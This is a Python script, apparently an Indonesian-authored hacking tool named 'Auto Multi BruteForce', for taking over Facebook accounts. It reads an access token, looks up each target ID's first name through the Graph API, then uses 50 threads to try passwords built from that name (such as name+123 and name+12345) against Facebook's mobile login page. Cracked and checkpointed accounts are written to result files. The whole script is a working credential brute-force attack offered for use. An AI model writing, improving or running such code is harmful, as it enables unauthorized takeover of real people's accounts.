import requests,os,sys,time,json
from multiprocessing.pool import  ThreadPool

class AutoB:
	def __init__(self):
		self.fnd=[]
		self.cek=[]
		self.hit=1
		self.ken=open('toket/token.txt','r').read()
		self.u='https://graph.facebook.com/{}'
		self.main()

	def nama(self,id):
		try:
			nem=requests.get(self.u.format(id+'/?access_token='+self.ken))
			js=json.loads(nem.text)
			if ' ' in js['first_name']:
				self.attk(id,js['first_name'].split(' ')[0])
			else:
				self.attk(id,js['first_name'])
		except: pass

	def attk(self,idd,name):
		lid=[name+'123',name+'12345',name.lower()+'123',name.lower()+'12345',self.spas]
		for x in lid:
			data={'email':idd,'pass':x}
			re=requests.post('https://mbasic.facebook.com/login',data=data).text
			if 'save-device' in re or 'm_sess' in re:
				pen=open('result/found.txt','a')
				pen.write(f'{idd}|{x}\n')
				self.fnd.append('ntaps')
				break
			elif 'checkpoint' in re:
				pen=open('result/cek.txt','a')
				pen.write(f'{idd}|{x}\n')
				self.cek.append('yaudah gpp')
				break
		print(f'\r[CRACK] >> {self.hit}/{len(self.file)} F[{len(self.fnd)}] CP[{len(self.cek)}] <<',end='');sys.stdout.flush()
		self.hit+=1

	def main(self):
		print("""
	;;;;;;;;;;;;;;;;;;;;;;;;;
	; Auto Multi BruteForce ;
	;    By: KANG-NEWBIE    ;
	;;;;;;;;;;;;;;;;;;;;;;;;;
	""")
		fil=input('[?] List Id Target: ')
		try:
			self.file=open(fil,'r').read().splitlines()
		except FileNotFoundError:
			exit('[!] File not found')
		tan=input('[?] Do you want enter extra password (y/n): ')
		if tan == 'y' or tan == 'Y':
			self.spas=input('[?] Extra password: ')
		else:
			self.spas=''
		print()
		p=ThreadPool(50)
		p.map(self.nama,self.file)
		if 'ntaps' in str(self.fnd) or 'yaudah gpp' in str(self.cek):
			print("\nFound ["+str(len(self.fnd))+"] CheckPoint ["+str(len(self.cek))+"]")
		else: print("\n[ :( ] nothing found")
		if len(self.fnd) > 0:
			print("found result saved: result/found.txt")
		if len(self.cek) > 0:
			print("check result saved: result/cek.txt")
try:
	AutoB()
except Exceptiona as FCK:
	print(f'Err: {FCK}')